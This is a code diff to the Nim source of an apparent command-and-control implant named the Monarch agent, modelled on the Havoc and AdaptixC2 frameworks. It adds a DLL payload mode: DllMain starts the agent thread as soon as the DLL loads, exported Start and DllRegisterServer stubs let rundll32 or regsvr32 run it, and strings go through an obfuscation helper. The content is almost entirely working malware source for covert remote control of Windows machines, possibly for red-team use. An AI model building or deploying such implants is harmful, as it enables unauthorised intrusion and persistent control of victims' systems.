@@ -112,7 +112,7 @@ proc agentMain() =
             print protect("[-] "), err.msg
 
 #[
-    Service functions
+    Payload type: Service Executable
     References: 
      - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/main/MainSvc.c
      - https://github.com/Adaptix-Framework/AdaptixC2/blob/main/AdaptixServer/extenders/beacon_agent/src_beacon/beacon/main.cpp
@@ -149,7 +149,60 @@ when defined(PAYLOAD_SVC):
         serviceStatus.dwCurrentState = SERVICE_STOPPED
         SetServiceStatus(statusHandle, addr serviceStatus)
 
-proc main() =
+#[
+    Payload type: DLL
+    References: 
+     - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/main/MainDll.c
+]#
+when defined(PAYLOAD_DLL):
+    proc NimMain() {.cdecl, importc.}
+    var gDllModule: HMODULE
+    var gAgentThread: HANDLE
+
+    proc agentThreadProc(lpParam: LPVOID): DWORD {.stdcall.} =
+        agentMain()
+        return 0
+
+    # rundll32.exe monarch.dll,Start
+    proc Start(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: cint) {.stdcall, exportc, dynlib.} =
+        while true:
+            Sleep(24 * 60 * 60 * 1000)
+
+    # regsvr32 /s monarch.dll
+    proc DllRegisterServer(): HRESULT {.stdcall, exportc, dynlib.} =
+        while true:
+            Sleep(24 * 60 * 60 * 1000)
+        return S_OK
+
+    proc DllMain(hinstDLL: HMODULE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc: protect("DllMain"), dynlib.} =
+        case fdwReason
+        of DLL_PROCESS_ATTACH:
+            NimMain()
+            gDllModule = hinstDLL
+            discard DisableThreadLibraryCalls(hinstDLL)
+            
+            var threadId: DWORD = 0
+            gAgentThread = CreateThread(nil, 0, agentThreadProc, nil, 0, addr threadId)
+            
+            return if gAgentThread != 0: TRUE else: FALSE
+        
+        of DLL_PROCESS_DETACH:
+            if gAgentThread != 0:
+                discard CloseHandle(gAgentThread)
+                gAgentThread = 0
+            return TRUE
+        
+        of DLL_THREAD_ATTACH, DLL_THREAD_DETACH:
+            return TRUE
+        
+        else:
+            return TRUE
+
+#[
+    Monarch agent entry point
+]#
+when isMainModule:
+    
     # SVC
     when defined(PAYLOAD_SVC):
         var serviceTable: array[2, SERVICE_TABLE_ENTRYA]
@@ -159,9 +212,11 @@ proc main() =
         serviceTable[1].lpServiceProc = NULL
         discard StartServiceCtrlDispatcherA(addr serviceTable[0])
     
+    # DLL
+    when defined(PAYLOAD_DLL):
+        # DLL entry point handles main function
+        discard 
+
     # EXE
     else:
         agentMain()
-
-when isMainModule:
-    main()
